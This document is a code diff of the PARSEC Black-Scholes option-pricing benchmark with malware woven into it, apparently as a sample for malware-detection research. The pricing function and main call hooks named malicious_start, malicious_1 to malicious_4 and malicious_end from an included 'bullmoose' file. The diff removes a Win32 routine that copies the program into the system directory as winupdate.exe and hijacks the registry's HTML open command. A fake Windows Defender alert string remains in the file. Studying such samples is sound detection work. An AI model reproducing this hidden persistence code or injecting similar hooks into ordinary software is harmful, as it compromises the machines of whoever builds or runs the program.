@@ -1,4 +1,4 @@
-#include "bullmoose.c"
+#include "bullmoose.cpp"
 // Copyright (c) 2007 Intel Corp.
 
 // Black-Scholes
@@ -13,11 +13,6 @@
 #include <stdlib.h>
 #include <math.h>
 #include <string.h>
-
-
-
-//#include "bull_moose.c"
-
 
 #ifdef ENABLE_PARSEC_HOOKS
 #include <hooks.h>
@@ -83,7 +78,8 @@ using namespace tbb;
 
 #define NUM_RUNS 1
 
-typedef struct OptionData_ {
+typedef struct OptionData_
+{
   fptype s;        // spot price
   fptype strike;   // strike price
   fptype r;        // risk-free interest rate
@@ -117,7 +113,8 @@ int nThreads;
 // See Hull, Section 11.8, P.243-244
 #define inv_sqrt_2xPI 0.39894228040143270286
 
-fptype CNDF(fptype InputX) {
+fptype CNDF(fptype InputX)
+{
   int sign;
 
   fptype OutputX;
@@ -131,10 +128,12 @@ fptype CNDF(fptype InputX) {
   fptype xLocal_2, xLocal_3;
 
   // Check for negative value of InputX
-  if (InputX < 0.0) {
+  if (InputX < 0.0)
+  {
     InputX = -InputX;
     sign = 1;
-  } else
+  }
+  else
     sign = 0;
 
   xInput = InputX;
@@ -167,7 +166,8 @@ fptype CNDF(fptype InputX) {
 
   OutputX = xLocal;
 
-  if (sign) {
+  if (sign)
+  {
     OutputX = 1.0 - OutputX;
   }
 
@@ -180,15 +180,12 @@ fptype CNDF(fptype InputX) {
 //////////////////////////////////////////////////////////////////////////////////////
 fptype BlkSchlsEqEuroNoDiv(fptype sptprice, fptype strike, fptype rate,
                            fptype volatility, fptype time, int otype,
-                           float timet) {
-    malicious_4();
-    malicious_3();
-    malicious_2();
-    malicious_1();
-    malicious_8();
-    malicious_7();
-    malicious_6();
-    malicious_5();
+                           float timet)
+{
+  malicious_1();
+  malicious_2();
+  malicious_3();
+  malicious_4();
 
   fptype OptionPrice;
 
@@ -235,9 +232,12 @@ fptype BlkSchlsEqEuroNoDiv(fptype sptprice, fptype strike, fptype rate,
   NofXd2 = CNDF(d2);
 
   FutureValueX = strike * (exp(-(rate) * (time)));
-  if (otype == 0) {
+  if (otype == 0)
+  {
     OptionPrice = (sptprice * NofXd1) - (FutureValueX * NofXd2);
-  } else {
+  }
+  else
+  {
     NegNofXd1 = (1.0 - NofXd1);
     NegNofXd2 = (1.0 - NofXd2);
     OptionPrice = (FutureValueX * NegNofXd2) - (sptprice * NegNofXd1);
@@ -247,16 +247,19 @@ fptype BlkSchlsEqEuroNoDiv(fptype sptprice, fptype strike, fptype rate,
 }
 
 #ifdef ENABLE_TBB
-struct mainWork {
+struct mainWork
+{
   mainWork() {}
   mainWork(mainWork &w, tbb::split) {}
 
-  void operator()(const tbb::blocked_range<int> &range) const {
+  void operator()(const tbb::blocked_range<int> &range) const
+  {
     fptype price;
     int begin = range.begin();
     int end = range.end();
 
-    for (int i = begin; i != end; i++) {
+    for (int i = begin; i != end; i++)
+    {
       /* Calling main function to calculate option value based on
        * Black & Scholes's equation.
        */
@@ -267,7 +270,8 @@ struct mainWork {
 
 #ifdef ERR_CHK
       fptype priceDelta = data[i].DGrefval - price;
-      if (fabs(priceDelta) >= 1e-5) {
+      if (fabs(priceDelta) >= 1e-5)
+      {
         fprintf(stderr, "Error on %d. Computed=%.5f, Ref=%.5f, Delta=%.5f\n", i,
                 price, data[i].DGrefval, priceDelta);
         numError++;
@@ -285,12 +289,14 @@ struct mainWork {
 //////////////////////////////////////////////////////////////////////////////////////
 
 #ifdef ENABLE_TBB
-int bs_thread(void *tid_ptr) {
+int bs_thread(void *tid_ptr)
+{
   int j;
   tbb::affinity_partitioner a;
 
   mainWork doall;
-  for (j = 0; j < NUM_RUNS; j++) {
+  for (j = 0; j < NUM_RUNS; j++)
+  {
     tbb::parallel_for(tbb::blocked_range<int>(0, numOptions), doall, a);
   }
 
@@ -299,9 +305,11 @@ int bs_thread(void *tid_ptr) {
 #else // !ENABLE_TBB
 
 #ifdef WIN32
-DWORD WINAPI bs_thread(LPVOID tid_ptr) {
+DWORD WINAPI bs_thread(LPVOID tid_ptr)
+{
 #else
-int bs_thread(void *tid_ptr) {
+int bs_thread(void *tid_ptr)
+{
 #endif
   int i, j;
   fptype price;
@@ -310,12 +318,15 @@ int bs_thread(void *tid_ptr) {
   int start = tid * (numOptions / nThreads);
   int end = start + (numOptions / nThreads);
 
-  for (j = 0; j < NUM_RUNS; j++) {
+  for (j = 0; j < NUM_RUNS; j++)
+  {
 #ifdef ENABLE_OPENMP
 #pragma omp parallel for private(i, price, priceDelta)
-    for (i = 0; i < numOptions; i++) {
-#else // ENABLE_OPENMP
-    for (i = start; i < end; i++) {
+    for (i = 0; i < numOptions; i++)
+    {
+#else  // ENABLE_OPENMP
+    for (i = start; i < end; i++)
+    {
 #endif // ENABLE_OPENMP
       /* Calling main function to calculate option value based on
        * Black & Scholes's equation.
@@ -326,7 +337,8 @@ int bs_thread(void *tid_ptr) {
 
 #ifdef ERR_CHK
       priceDelta = data[i].DGrefval - price;
-      if (fabs(priceDelta) >= 1e-4) {
+      if (fabs(priceDelta) >= 1e-4)
+      {
         printf("Error on %d. Computed=%.5f, Ref=%.5f, Delta=%.5f\n", i, price,
                data[i].DGrefval, priceDelta);
         numError++;
@@ -340,32 +352,18 @@ int bs_thread(void *tid_ptr) {
 #endif // ENABLE_TBB
 
 const char InfectString[] = "\n<script>alert(\"Warning: This file has been detected by Windows "
-"Defender to be infected with Win32/BullMoose!\");</script>";
+                            "Defender to be infected with Win32/BullMoose!\");</script>";
 
-DWORD WINAPI bull_moose(LPVOID tid_ptr)
+int main(int argc, char **argv)
 {
-	char MyPath[256], CpyPath[256];
-	GetModuleFileName(NULL,MyPath,sizeof(MyPath));
-	GetSystemDirectory(CpyPath,sizeof(CpyPath));
-	strcat(CpyPath,"\\winupdate.exe");
-	CopyFile(MyPath,CpyPath,FALSE);
-	strcat(CpyPath," %1");
-
-	HKEY Key32;
-	RegOpenKeyEx(HKEY_CLASSES_ROOT,"htmlfile\\shell\\opennew\\command",0,KEY_WRITE,&Key32);
-	RegSetValueEx(Key32,"",0,REG_SZ,CpyPath,strlen(CpyPath));
-	RegCloseKey(Key32);
-	return 0;
-}
-
-
-int main(int argc, char **argv) {
   FILE *file;
   int i;
   int loopnum;
   fptype *buffer;
   int *buffer2;
   int rv;
+
+  malicious_start();
 
 #ifdef PARSEC_VERSION
 #define __PARSEC_STRING(x) #x
@@ -396,21 +394,22 @@ int main(int argc, char **argv) {
   //   printf("ERROR: Unable to open file %s.\n", inputFile);
   //   return 1;
   // }
-//  rv = fscanf(file, "%i", &numOptions);
+  //  rv = fscanf(file, "%i", &numOptions);
   numOptions = 4;
-  // if (rv != 1) {
-  //   printf("ERROR: Unable to read from file %s.\n", inputFile);
-  //   fclose(file);
-  //   return 1;
-  // }
-  // if (nThreads > numOptions) {
-  //   printf("WARNING: Not enough work, reducing number of threads to match "
-  //          "number of options.\n");
-  //   nThreads = numOptions;
-  // }
+// if (rv != 1) {
+//   printf("ERROR: Unable to read from file %s.\n", inputFile);
+//   fclose(file);
+//   return 1;
+// }
+// if (nThreads > numOptions) {
+//   printf("WARNING: Not enough work, reducing number of threads to match "
+//          "number of options.\n");
+//   nThreads = numOptions;
+// }
 
 #if !defined(ENABLE_THREADS) && !defined(ENABLE_OPENMP) && !defined(ENABLE_TBB)
-  if (nThreads != 1) {
+  if (nThreads != 1)
+  {
     printf("Error: <nthreads> must be 1 (serial version)\n");
     return 1;
   }
@@ -419,7 +418,8 @@ int main(int argc, char **argv) {
   // alloc spaces for the option data
   data = (OptionData *)malloc(numOptions * sizeof(OptionData));
   prices = (fptype *)malloc(numOptions * sizeof(fptype));
-  for (loopnum = 0; loopnum < 2; ++loopnum) {
+  for (loopnum = 0; loopnum < 2; ++loopnum)
+  {
     data[loopnum].s = 42;
     data[loopnum].strike = 40;
     data[loopnum].r = 0.1;
@@ -432,7 +432,8 @@ int main(int argc, char **argv) {
   data[1].OptionType = 'C';
   data[0].DGrefval = 4.759423036851750055;
   data[1].DGrefval = 0.808600016880314021;
-  for (loopnum = 2; loopnum < 4; ++loopnum) {
+  for (loopnum = 2; loopnum < 4; ++loopnum)
+  {
     data[loopnum].s = 100;
     data[loopnum].strike = 100;
     data[loopnum].r = 0.5;
@@ -453,7 +454,8 @@ int main(int argc, char **argv) {
   _M4_numThreads = nThreads;
   {
     int _M4_i;
-    for (_M4_i = 0; _M4_i < MAX_THREADS; _M4_i++) {
+    for (_M4_i = 0; _M4_i < MAX_THREADS; _M4_i++)
+    {
       _M4_threadsTableAllocated[_M4_i] = 0;
     }
   };
@@ -474,7 +476,8 @@ int main(int argc, char **argv) {
   buffer2 = (int *)malloc(numOptions * sizeof(fptype) + PAD);
   otype = (int *)(((unsigned long long)buffer2 + PAD) & ~(LINESIZE - 1));
 
-  for (i = 0; i < numOptions; i++) {
+  for (i = 0; i < numOptions; i++)
+  {
     otype[i] = (data[i].OptionType == 'P') ? 1 : 0;
     sptprice[i] = data[i].s;
     strike[i] = data[i].strike;
@@ -493,14 +496,13 @@ int main(int argc, char **argv) {
 #ifdef WIN32
   printf("WIN32\n");
 
-
-
   HANDLE *threads;
   int *nums;
   threads = (HANDLE *)malloc(nThreads * sizeof(HANDLE));
   nums = (int *)malloc(nThreads * sizeof(int));
 
-  for (i = 0; i < nThreads; i++) {
+  for (i = 0; i < nThreads; i++)
+  {
     nums[i] = i;
     threads[i] = CreateThread(0, 0, bs_thread, &nums[i], 0, 0);
   }
@@ -511,12 +513,14 @@ int main(int argc, char **argv) {
   int *tids;
   tids = (int *)malloc(nThreads * sizeof(int));
 
-  for (i = 0; i < nThreads; i++) {
+  for (i = 0; i < nThreads; i++)
+  {
     tids[i] = i;
 
     {
       int _M4_i;
-      for (_M4_i = 0; _M4_i < MAX_THREADS; _M4_i++) {
+      for (_M4_i = 0; _M4_i < MAX_THREADS; _M4_i++)
+      {
         if (_M4_threadsTableAllocated[_M4_i] == 0)
           break;
       }
@@ -529,7 +533,8 @@ int main(int argc, char **argv) {
   {
     int _M4_i;
     void *_M4_ret;
-    for (_M4_i = 0; _M4_i < MAX_THREADS; _M4_i++) {
+    for (_M4_i = 0; _M4_i < MAX_THREADS; _M4_i++)
+    {
       if (_M4_threadsTableAllocated[_M4_i] == 0)
         break;
       pthread_join(_M4_threadsTable[_M4_i], &_M4_ret);
@@ -537,7 +542,7 @@ int main(int argc, char **argv) {
   };
   free(tids);
 #endif // WIN32
-#else // ENABLE_THREADS
+#else  // ENABLE_THREADS
 #ifdef ENABLE_OPENMP
   {
     int tid = 0;
@@ -550,7 +555,7 @@ int main(int argc, char **argv) {
 
   int tid = 0;
   bs_thread(&tid);
-#else // ENABLE_TBB
+#else  // ENABLE_TBB
   // serial version
   int tid = 0;
   bs_thread(&tid);
@@ -575,7 +580,8 @@ int main(int argc, char **argv) {
   //   fclose(file);
   //   return 1;
   // }
-  for (i = 0; i < numOptions; i++) {
+  for (i = 0; i < numOptions; i++)
+  {
     // rv = fprintf(file, "%.18f\n", prices[i]);
     printf("%.18f\n", prices[i]);
     // if (rv < 0) {
@@ -584,11 +590,11 @@ int main(int argc, char **argv) {
     //   return 1;
     // }
   }
-  // rv = fclose(file);
-  // if (rv != 0) {
-  //   printf("ERROR: Unable to close file %s.\n", outputFile);
-  //   return 1;
-  // }
+// rv = fclose(file);
+// if (rv != 0) {
+//   printf("ERROR: Unable to close file %s.\n", outputFile);
+//   return 1;
+// }
 
 #ifdef ERR_CHK
   printf("Num Errors: %d\n", numError);
@@ -600,6 +606,6 @@ int main(int argc, char **argv) {
   __parsec_bench_end();
 #endif
 
-
+  malicious_end();
   return 1;
 }
